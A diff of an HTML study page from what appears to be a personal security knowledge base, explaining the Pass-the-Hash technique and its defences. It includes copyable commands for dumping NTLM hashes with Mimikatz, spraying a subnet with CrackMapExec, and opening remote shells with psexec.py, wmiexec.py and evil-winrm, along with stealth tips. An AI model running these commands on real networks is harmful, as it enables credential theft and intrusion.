@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:57 -->
+<!-- 2026-07-30 Thu 22:15 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Pass-the-Hash</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,47 +886,49 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org9d31486">Pass-the-Hash</a>
+<li><a href="#org4b37856">Why it is Effective</a></li>
+<li><a href="#orgfe7db03">Defensive Countermeasures</a></li>
+<li><a href="#orgaf161b0">Examples</a>
 <ul>
-<li><a href="#orgd1f0b09">Description</a>
-<ul>
-<li><a href="#org4026720">Why it is Effective</a></li>
-<li><a href="#orgf5da5d9">Defensive Countermeasures</a></li>
+<li><a href="#org7f3f161">1. Extracting the Hash</a></li>
+<li><a href="#orgbf9f699">2. Passing the Hash with CrackMapExec</a></li>
+<li><a href="#orgd5c87f4">3. Spawning a Shell (Impacket)</a></li>
+<li><a href="#org8175341">4. Pass-the-Hash with evil-winrm</a></li>
 </ul>
 </li>
-<li><a href="#org87400bc">Examples</a>
-<ul>
-<li><a href="#org73c01e5">. Extracting the Hash</a></li>
-</ul>
-</li>
-<li><a href="#org161aabc">2. Passing the Hash with CrackMapExec</a>
-<ul>
-<li><a href="#orgd245892">3. Spawning a Shell (Impacket)</a></li>
-</ul>
-</li>
-</ul>
-</li>
+<li><a href="#org62cc8d9">Choosing a Tool</a></li>
+<li><a href="#org4f78007">Tips</a></li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org9d31486" class="outline-2">
-<h2 id="org9d31486">Pass-the-Hash</h2>
-<div class="outline-text-2" id="text-org9d31486">
-</div>
-<div id="outline-container-orgd1f0b09" class="outline-3">
-<h3 id="orgd1f0b09">Description</h3>
-<div class="outline-text-3" id="text-orgd1f0b09">
 <p>
-In a Windows environment, passwords are not stored in plaintext; instead, they are transformed into mathematical representations called <b>hashes</b> (typically NTLM). When you log into a service over a network using NTLM authentication, the protocol validates your identity by using this hash.
+In a Windows environment, passwords are not stored in plaintext;
+instead, they are transformed into mathematical representations
+called hashes (typically NTLM). When you log into a service over a
+network using NTLM authentication, the protocol validates your
+identity by using this hash.
 </p>
 
 <p>
-Because the system treats the hash as the "proof of identity," an attacker who successfully steals a hash from a machine's memory (using tools like <a href="Mimikatz.html#mimikatz">Mimikatz</a>) can simply "pass" that hash to another machine. The target machine accepts the hash as valid evidence that the user knows the password, granting the attacker access.
+Because the system treats the hash as the "proof of identity," an
+attacker who successfully steals a hash from a machine's memory
+(using tools like <a href="20260314T005731--mimikatz__cybersecurity_tool.html">mimikatz</a>) can simply
+"pass" that hash to another machine. The target machine accepts the
+hash as valid evidence that the user knows the password, granting
+the attacker access.
 </p>
-</div>
-<div id="outline-container-org4026720" class="outline-4">
-<h4 id="org4026720">Why it is Effective</h4>
-<div class="outline-text-4" id="text-org4026720">
+
+<p>
+Related: <a href="20260314T005731--mimikatz__cybersecurity_tool.html">Mimikatz</a>
+         <a href="20260314T005739--pass-the-ticket__cybersecurity_technique.html">Pass-the-Ticket</a>
+         <a href="20260314T005712--kerberos__concept_cybersecurity.html">Kerberos</a>
+         <a href="20260314T005713--lateral-movement__concept_cybersecurity.html">Lateral movement</a>
+         <a href="20260327T190647--active-directory__concept.html">Active Directory</a>
+         <a href="20260213T071359--bloodhound__cybersecurity_tool.html">BloodHound</a>
+</p>
+<div id="outline-container-org4b37856" class="outline-2">
+<h2 id="org4b37856">Why it is Effective</h2>
+<div class="outline-text-2" id="text-org4b37856">
 <ul class="org-ul">
 <li><b>No Cracking Required:</b> Attackers don't need to spend time or computing power trying to "crack" the hash back into a password.</li>
 <li><b>SSO Convenience:</b> Because Windows uses Single Sign-On (SSO) features, hashes for multiple users (including Domain Admins) are often cached in the memory of workstations they have logged into.</li>
@@ -916,97 +936,218 @@ Because the system treats the hash as the "proof of identity," an attacker who s
 </ul>
 </div>
 </div>
-<div id="outline-container-orgf5da5d9" class="outline-4">
-<h4 id="orgf5da5d9">Defensive Countermeasures</h4>
-<div class="outline-text-4" id="text-orgf5da5d9">
+<div id="outline-container-orgfe7db03" class="outline-2">
+<h2 id="orgfe7db03">Defensive Countermeasures</h2>
+<div class="outline-text-2" id="text-orgfe7db03">
 <ul class="org-ul">
 <li><b>Restricted Admin Groups:</b> Limiting where administrators can log in to prevent their hashes from being cached on high-risk machines.</li>
 <li><b>LSA Protection &amp; Credential Guard:</b> Modern Windows features that isolate the process (LSASS) where these hashes are stored.</li>
-<li><b>Kerberos:</b> Moving away from NTLM toward Kerberos authentication makes PtH significantly harder (though it introduces other risks like Golden Tickets).</li>
+<li><b>Kerberos:</b> Moving away from NTLM toward Kerberos authentication makes PtH significantly harder (though it introduces other risks like Golden Tickets — see <a href="20260314T005739--pass-the-ticket__cybersecurity_technique.html">Pass-the-Ticket</a>).</li>
 </ul>
 
 <hr />
 </div>
 </div>
+<div id="outline-container-orgaf161b0" class="outline-2">
+<h2 id="orgaf161b0">Examples</h2>
+<div class="outline-text-2" id="text-orgaf161b0">
 </div>
-<div id="outline-container-org87400bc" class="outline-3">
-<h3 id="org87400bc">Examples</h3>
-<div class="outline-text-3" id="text-org87400bc">
-</div>
-<div id="outline-container-org73c01e5" class="outline-4">
-<h4 id="org73c01e5">. Extracting the Hash</h4>
-<div class="outline-text-4" id="text-org73c01e5">
+<div id="outline-container-org7f3f161" class="outline-3">
+<h3 id="org7f3f161">1. Extracting the Hash</h3>
+<div class="outline-text-3" id="text-org7f3f161">
 <p>
 Before passing a hash, an attacker must first harvest it. This is commonly done using Mimikatz on a compromised machine where they have administrative rights.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_8424d88c762c4e3780d31fea5fbe74cc>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_c4a230dd52e94b6a9084bc157c110c5c>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8424d88c762c4e3780d31fea5fbe74cc=document.querySelector('button[name=btn_8424d88c762c4e3780d31fea5fbe74cc]');
-copyBtnbtn_8424d88c762c4e3780d31fea5fbe74cc.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Using Mimikatz to dump NTLM hashes from memory\nsekurlsa::logonpasswords\n`);copyBtnbtn_8424d88c762c4e3780d31fea5fbe74cc.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8424d88c762c4e3780d31fea5fbe74cc.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_c4a230dd52e94b6a9084bc157c110c5c=document.querySelector('button[name=btn_c4a230dd52e94b6a9084bc157c110c5c]');
+copyBtnbtn_c4a230dd52e94b6a9084bc157c110c5c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Using Mimikatz to dump NTLM hashes from memory\nsekurlsa::logonpasswords\n`);copyBtnbtn_c4a230dd52e94b6a9084bc157c110c5c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c4a230dd52e94b6a9084bc157c110c5c.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
-<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Using Mimikatz to dump NTLM hashes from memory
-</span>sekurlsa::logonpasswords
+<pre class="src src-powershell"># Using Mimikatz to dump NTLM hashes from memory
+sekurlsa::logonpasswords
 </pre>
 </div></div>
 
 <p>
 <b>Output Example:</b> <code>User: Administrator | NTLM: 2b5762c448386345672224090018678d</code>
 </p>
+
+<p>
+Hashes are also commonly obtained without ever touching LSASS
+directly — via
+<a href="20260213T071359--bloodhound__cybersecurity_tool.html">BloodHound</a>-identified DCSync rights
+(see the Mimikatz note's DCSync section), or from a SAM/NTDS.dit
+dump on a compromised host.
+</p>
 </div>
 </div>
-</div>
-<div id="outline-container-org161aabc" class="outline-3">
-<h3 id="org161aabc">2. Passing the Hash with CrackMapExec</h3>
-<div class="outline-text-3" id="text-org161aabc">
+<div id="outline-container-orgbf9f699" class="outline-3">
+<h3 id="orgbf9f699">2. Passing the Hash with CrackMapExec</h3>
+<div class="outline-text-3" id="text-orgbf9f699">
 <p>
 CrackMapExec (CME) is a popular tool for lateral movement. An attacker can use the captured hash to see if it works on other machines in the network.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SH</span><button class='copyBtn' name=btn_e6a5b71122a846ce9581ca54f29da76a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8102e11d6ce749d8a2f61d181d2cc45d>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e6a5b71122a846ce9581ca54f29da76a=document.querySelector('button[name=btn_e6a5b71122a846ce9581ca54f29da76a]');
-copyBtnbtn_e6a5b71122a846ce9581ca54f29da76a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Attempt to authenticate to an entire subnet using the Administrator hash\ncme smb 192.168.1.0/24 -u Administrator -H 2b5762c448386345672224090018678d\n`);copyBtnbtn_e6a5b71122a846ce9581ca54f29da76a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e6a5b71122a846ce9581ca54f29da76a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_8102e11d6ce749d8a2f61d181d2cc45d=document.querySelector('button[name=btn_8102e11d6ce749d8a2f61d181d2cc45d]');
+copyBtnbtn_8102e11d6ce749d8a2f61d181d2cc45d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Attempt to authenticate to an entire subnet using the Administrator hash\ncme smb 192.168.1.0/24 -u Administrator -H 2b5762c448386345672224090018678d\n\n# Confirm which hosts accepted the hash before attempting further action\ncme smb 192.168.1.0/24 -u Administrator -H 2b5762c448386345672224090018678d --shares\n`);copyBtnbtn_8102e11d6ce749d8a2f61d181d2cc45d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8102e11d6ce749d8a2f61d181d2cc45d.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
-<pre class="src src-sh"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Attempt to authenticate to an entire subnet using the Administrator hash
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Attempt to authenticate to an entire subnet using the Administrator hash
 </span>cme smb 192.168.1.0/24 -u Administrator -H 2b5762c448386345672224090018678d
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Confirm which hosts accepted the hash before attempting further action
+</span>cme smb 192.168.1.0/24 -u Administrator -H 2b5762c448386345672224090018678d --shares
 </pre>
 </div></div>
 </div>
-<div id="outline-container-orgd245892" class="outline-4">
-<h4 id="orgd245892">3. Spawning a Shell (Impacket)</h4>
-<div class="outline-text-4" id="text-orgd245892">
+</div>
+<div id="outline-container-orgd5c87f4" class="outline-3">
+<h3 id="orgd5c87f4">3. Spawning a Shell (Impacket)</h3>
+<div class="outline-text-3" id="text-orgd5c87f4">
 <p>
 Using the Impacket library, an attacker can get a full command-line shell on a remote target using only the hash.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SH</span><button class='copyBtn' name=btn_51f54f0516a644099344a2245e0f176c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_6e6e9210e2724751ba56be51aec215c8>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_51f54f0516a644099344a2245e0f176c=document.querySelector('button[name=btn_51f54f0516a644099344a2245e0f176c]');
-copyBtnbtn_51f54f0516a644099344a2245e0f176c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Using psexec.py to gain a SYSTEM shell on a remote target\npython3 psexec.py -hashes :2b5762c448386345672224090018678d Administrator@192.168.1.50\n`);copyBtnbtn_51f54f0516a644099344a2245e0f176c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_51f54f0516a644099344a2245e0f176c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_6e6e9210e2724751ba56be51aec215c8=document.querySelector('button[name=btn_6e6e9210e2724751ba56be51aec215c8]');
+copyBtnbtn_6e6e9210e2724751ba56be51aec215c8.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Using psexec.py to gain a SYSTEM shell on a remote target\npython3 psexec.py -hashes :2b5762c448386345672224090018678d Administrator@192.168.1.50\n\n# wmiexec.py — quieter alternative, doesn't drop a service binary\n# to disk the way psexec.py does\npython3 wmiexec.py -hashes :2b5762c448386345672224090018678d Administrator@192.168.1.50\n`);copyBtnbtn_6e6e9210e2724751ba56be51aec215c8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6e6e9210e2724751ba56be51aec215c8.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
-<pre class="src src-sh"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Using psexec.py to gain a SYSTEM shell on a remote target
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Using psexec.py to gain a SYSTEM shell on a remote target
 </span>python3 psexec.py -hashes :2b5762c448386345672224090018678d Administrator@192.168.1.50
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">wmiexec.py &#8212; quieter alternative, doesn't drop a service binary
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">to disk the way psexec.py does
+</span>python3 wmiexec.py -hashes :2b5762c448386345672224090018678d Administrator@192.168.1.50
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org8175341" class="outline-3">
+<h3 id="org8175341">4. Pass-the-Hash with evil-winrm</h3>
+<div class="outline-text-3" id="text-org8175341">
+<p>
+If WinRM is available on the target, evil-winrm accepts a hash
+directly rather than requiring a plaintext password.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_997fc23a28d04476ba74d44374550001>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_997fc23a28d04476ba74d44374550001=document.querySelector('button[name=btn_997fc23a28d04476ba74d44374550001]');
+copyBtnbtn_997fc23a28d04476ba74d44374550001.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`evil-winrm -i 192.168.1.50 -u Administrator -H 2b5762c448386345672224090018678d\n`);copyBtnbtn_997fc23a28d04476ba74d44374550001.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_997fc23a28d04476ba74d44374550001.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell">evil-winrm -i 192.168.1.50 -u Administrator -H 2b5762c448386345672224090018678d
 </pre>
 </div></div>
 </div>
 </div>
 </div>
+<div id="outline-container-org62cc8d9" class="outline-2">
+<h2 id="org62cc8d9">Choosing a Tool</h2>
+<div class="outline-text-2" id="text-org62cc8d9">
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="org-left" />
+
+<col  class="org-left" />
+
+<col  class="org-left" />
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">Tool</th>
+<th scope="col" class="org-left">Gives you</th>
+<th scope="col" class="org-left">Noise level</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">CrackMapExec</td>
+<td class="org-left">Fast spray across many hosts, no shell</td>
+<td class="org-left">Low — good for initial "does this hash work anywhere" sweep</td>
+</tr>
+
+<tr>
+<td class="org-left">psexec.py</td>
+<td class="org-left">Full SYSTEM shell</td>
+<td class="org-left">Higher — drops and runs a service binary on disk</td>
+</tr>
+
+<tr>
+<td class="org-left">wmiexec.py</td>
+<td class="org-left">Full shell, semi-interactive</td>
+<td class="org-left">Lower than psexec — no service binary dropped</td>
+</tr>
+
+<tr>
+<td class="org-left">evil-winrm</td>
+<td class="org-left">Full interactive shell via WinRM</td>
+<td class="org-left">Depends on WinRM logging; requires WinRM enabled on target</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<div id="outline-container-org4f78007" class="outline-2">
+<h2 id="org4f78007">Tips</h2>
+<div class="outline-text-2" id="text-org4f78007">
+<ul class="org-ul">
+<li>Spray with CrackMapExec across the whole subnet first to identify
+which hosts accept the hash before committing to a specific
+exploitation tool — no point spawning a shell attempt against a
+host that will reject the hash anyway</li>
+<li><code>wmiexec.py</code> is generally quieter than <code>psexec.py</code> since it
+doesn't write a service executable to disk — prefer it when
+detection/OpSec matters, though on a CTF/exam context this rarely
+affects outcome</li>
+<li>A hash obtained via Mimikatz's <code>sekurlsa::logonpasswords</code> only
+reflects accounts that have actually logged into that specific
+machine — if the target account you want has never logged into
+the box you're on, look toward DCSync or NTDS.dit extraction
+instead</li>
+<li>On the exam, PtH is classified under Lateral Movement /
+Credential-based attacks, not a standalone finding category — tie
+it back to how the hash was originally obtained when writing up
+the full chain</li>
+</ul>
+</div>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1014,6 +1155,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
